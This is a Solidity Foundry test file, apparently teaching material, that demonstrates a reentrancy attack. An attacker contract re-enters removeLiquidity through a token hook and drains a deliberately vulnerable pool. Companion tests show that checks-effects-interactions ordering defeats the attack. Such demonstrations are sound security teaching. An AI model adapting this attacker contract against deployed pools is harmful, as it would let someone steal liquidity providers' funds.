// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, stdError} from "forge-std/Test.sol";
import {Token} from "../src/Token.sol";
import {Pool} from "../src/Pool.sol";
import {HookToken, ITokenReceiver} from "../src/vulnerable/HookToken.sol";
import {PoolReentrant} from "../src/vulnerable/PoolReentrant.sol";

interface IRemovable {
    function removeLiquidity(uint256 shares) external returns (uint256 amount0, uint256 amount1);
}

contract ReentrancyAttacker is ITokenReceiver {
    IRemovable public immutable pool;
    bool public immutable swallowRevert;

    uint256 public sharesToWithdraw;
    uint256 public reentries;

    // These record nested-call results if a nested withdrawal succeeds.
    uint256 public nestedAmount0;
    uint256 public nestedAmount1;

    constructor(IRemovable _pool, bool _swallowRevert) {
        pool = _pool;
        swallowRevert = _swallowRevert;
    }

    function attack(uint256 shares) external {
        sharesToWithdraw = shares;
        pool.removeLiquidity(shares);
    }

    function onTokenReceived(address, uint256) external override {
        // Re-enter at most once.
        if (reentries < 1) {
            reentries++;

            if (swallowRevert) {
                // Catch a failed nested withdrawal so the outer call can finish.
                try pool.removeLiquidity(sharesToWithdraw) returns (uint256 amount0, uint256 amount1) {
                    nestedAmount0 = amount0;
                    nestedAmount1 = amount1;
                } catch {}
            } else {
                // Vulnerable-pool mode: let the nested revert bubble up.
                pool.removeLiquidity(sharesToWithdraw);
            }
        }
    }
}

// ------------------------------------------------------------
// Session 4: intentionally vulnerable pool
// ------------------------------------------------------------

contract ReentrancyAttackTest is Test {
    HookToken token0;
    Token token1;
    PoolReentrant pool;
    ReentrancyAttacker attacker;

    address lp = makeAddr("lp");

    function setUp() public {
        token0 = new HookToken("Token 0", "T0");
        token1 = new Token("Token 1", "T1");
        pool = new PoolReentrant(token0, token1);

        attacker = new ReentrancyAttacker(IRemovable(address(pool)), false);

        token0.mint(lp, 1_000);
        token1.mint(lp, 1_000);

        vm.startPrank(lp);
        token0.approve(address(pool), type(uint256).max);
        token1.approve(address(pool), type(uint256).max);
        pool.addLiquidity(1_000, 1_000, 0);
        vm.stopPrank();

        token0.mint(address(attacker), 1_000);
        token1.mint(address(attacker), 1_000);

        vm.startPrank(address(attacker));
        token0.approve(address(pool), type(uint256).max);
        token1.approve(address(pool), type(uint256).max);
        pool.addLiquidity(1_000, 1_000, 0);
        vm.stopPrank();
    }

    function test_ReentrantWithdrawalDrainsPool() public {
        assertEq(pool.shares(address(attacker)), 1_000);
        assertEq(pool.shares(lp), 900);
        assertEq(pool.totalShares(), 2_000);
        assertEq(pool.reserve0(), 2_000);
        assertEq(pool.reserve1(), 2_000);

        attacker.attack(1_000);

        assertEq(attacker.reentries(), 1);

        assertEq(token0.balanceOf(address(attacker)), 2_000);
        assertEq(token1.balanceOf(address(attacker)), 2_000);

        assertEq(pool.shares(address(attacker)), 0);
        assertEq(pool.shares(lp), 900);
        assertEq(pool.totalShares(), 0);

        assertEq(pool.reserve0(), 0);
        assertEq(pool.reserve1(), 0);
        assertEq(token0.balanceOf(address(pool)), 0);
        assertEq(token1.balanceOf(address(pool)), 0);

        // The LP still has shares, but the pool has zero total shares.
        // Its withdrawal consequently fails with division by zero.
        vm.expectRevert(stdError.divisionError);
        vm.prank(lp);
        pool.removeLiquidity(900);
    }
}

// ------------------------------------------------------------
// Session 5: real pool, checks-effects-interactions ordering
// ------------------------------------------------------------

contract RealPoolReentrancyTest is Test {
    HookToken token0;
    Token token1;
    Pool pool;

    address lp = makeAddr("lp");

    function setUp() public {
        token0 = new HookToken("Token 0", "T0");
        token1 = new Token("Token 1", "T1");
        pool = new Pool(token0, token1);

        token0.mint(lp, 1_000);
        token1.mint(lp, 1_000);

        vm.startPrank(lp);
        token0.approve(address(pool), type(uint256).max);
        token1.approve(address(pool), type(uint256).max);
        pool.addLiquidity(1_000, 1_000, 0);
        vm.stopPrank();
    }

    function _prepareAttacker(bool swallowRevert) internal returns (ReentrancyAttacker newAttacker) {
        newAttacker = new ReentrancyAttacker(IRemovable(address(pool)), swallowRevert);

        token0.mint(address(newAttacker), 1_000);
        token1.mint(address(newAttacker), 1_000);

        vm.startPrank(address(newAttacker));
        token0.approve(address(pool), type(uint256).max);
        token1.approve(address(pool), type(uint256).max);
        pool.addLiquidity(1_000, 1_000, 0);
        vm.stopPrank();
    }

    function test_NaiveReentrancyReverts() public {
        ReentrancyAttacker attacker = _prepareAttacker(false);

        assertEq(pool.shares(address(attacker)), 1_000);
        assertEq(pool.shares(lp), 900);
        assertEq(pool.totalShares(), 2_000);
        assertEq(pool.reserve0(), 2_000);
        assertEq(pool.reserve1(), 2_000);

        // The hook attempts to withdraw again after the outer call has
        // already burned the attacker's shares. That nested call must fail.
        vm.expectRevert(abi.encodeWithSelector(Pool.InsufficientShares.selector, 0, 1_000));

        attacker.attack(1_000);

        // The bubbled-up revert rolls the entire attack back.
        assertEq(attacker.reentries(), 0);
        assertEq(pool.shares(address(attacker)), 1_000);
        assertEq(pool.shares(lp), 900);
        assertEq(pool.totalShares(), 2_000);
        assertEq(pool.reserve0(), 2_000);
        assertEq(pool.reserve1(), 2_000);

        assertEq(token0.balanceOf(address(attacker)), 0);
        assertEq(token1.balanceOf(address(attacker)), 0);
        assertEq(token0.balanceOf(address(pool)), 2_000);
        assertEq(token1.balanceOf(address(pool)), 2_000);
    }

    function test_SwallowedReentrancyGainsNothing() public {
        ReentrancyAttacker attacker = _prepareAttacker(true);

        attacker.attack(1_000);

        // The nested call failed, but the attacker caught its revert.
        assertEq(attacker.reentries(), 1);
        assertEq(attacker.nestedAmount0(), 0);
        assertEq(attacker.nestedAmount1(), 0);

        // Only the single, legitimate withdrawal succeeds.
        assertEq(token0.balanceOf(address(attacker)), 1_000);
        assertEq(token1.balanceOf(address(attacker)), 1_000);

        assertEq(pool.shares(address(attacker)), 0);
        assertEq(pool.shares(lp), 900);
        assertEq(pool.totalShares(), 1_000);
        assertEq(pool.reserve0(), 1_000);
        assertEq(pool.reserve1(), 1_000);

        assertEq(token0.balanceOf(address(pool)), 1_000);
        assertEq(token1.balanceOf(address(pool)), 1_000);

        // The honest LP can still withdraw the 900 shares they own.
        vm.prank(lp);
        (uint256 amount0, uint256 amount1) = pool.removeLiquidity(900);

        assertEq(amount0, 900);
        assertEq(amount1, 900);

        assertEq(pool.shares(lp), 0);
        assertEq(pool.totalShares(), 100);
        assertEq(pool.reserve0(), 100);
        assertEq(pool.reserve1(), 100);

        assertEq(token0.balanceOf(address(pool)), 100);
        assertEq(token1.balanceOf(address(pool)), 100);
        assertEq(token0.balanceOf(lp), 900);
        assertEq(token1.balanceOf(lp), 900);
    }
}
